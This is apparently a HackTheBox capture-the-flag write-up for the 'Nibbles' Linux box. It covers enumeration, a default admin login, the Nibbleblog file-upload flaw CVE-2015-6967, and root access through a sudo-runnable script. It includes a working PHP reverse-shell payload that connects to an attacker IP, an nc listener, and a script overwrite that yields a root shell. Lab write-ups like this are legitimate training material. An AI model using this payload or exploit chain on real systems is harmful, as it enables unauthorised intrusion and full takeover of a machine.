## 📌 Box Info
- **OS**: [Linux](Linux)
- **Difficulty**: [Easy](Easy)
- Platform: [HTB](HTB)](Easy)

---

### 🕵️ Enumeration

#### 🔍 Nmap Scan
```bash
sudo nmap -sV -sC -sS -oA scan/result $IP
```
Discovered open ports:
- **22/tcp** - [SSH](SSH)
- **80/tcp** - [HTTP](HTTP.md)

### 🌐 Web Enumeration
Visiting the site on port 80 reveals a PHP-based web application. View page source shows a hidden directory:

**Interesting Directory:** `/nibbleblog/`

#### 📂 Directory Fuzzing
```bash
gobuster dir --url "http://$IP/nibbleblog/" -w /usr/share/dirb/wordlists/small.txt -x php
```
Discovered:
- `/admin.php` – Admin login page

---

### 🔐 Exploitation

#### 🔑 Default Credentials & Exploit
- Found **default credentials**: `admin:nibbles`
- Confirmed to work on `/nibbleblog/admin.php`
- Vulnerable version: **Nibbleblog 4.0.3**
- Public exploit: CVE-2015-6967 – Arbitrary File Upload

#### 🐚 Reverse Shell Upload
Upload a PHP reverse shell through the **my_image** plugin:

**Payload (Replace IP and port):**
```php
<?php
// PHP Reverse Shell
$sock=fsockopen("<ATTACKER_IP>",9001);
$proc=proc_open("/bin/sh", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);
?>
```

Start listener:
```bash
nc -nlvp 9001
```

Trigger the shell:
```bash
curl http://$IP/nibbleblog/content/private/plugins/my_image/image.php
```

---

### 🧗 Privilege Escalation

#### 🔍 Finding Personal Files
Found file: `personal.zip`  
Unzipped it contains a **bash script** monitoring resources.

```bash
sudo -l
```
Shows we can run the monitoring script **as root without password**.

#### 🛠️ Modify Script
Append reverse shell code or just spawn root shell:
```bash
#!/bin/bash
bash
```
Upload and overwrite the original script. Then execute it with sudo:
```bash
sudo /path/to/monitoring_script.sh
```

### 🏁 Root Access
You now have a **root shell** on the machine.

---

### 📝 Summary
- Gained web access using default creds on Nibbleblog.
- Exploited CVE-2015-6967 to upload a reverse shell.
- Found a user-owned zip file containing a script run as root.
- Modified script to spawn a root shell.

Cheers 🥂

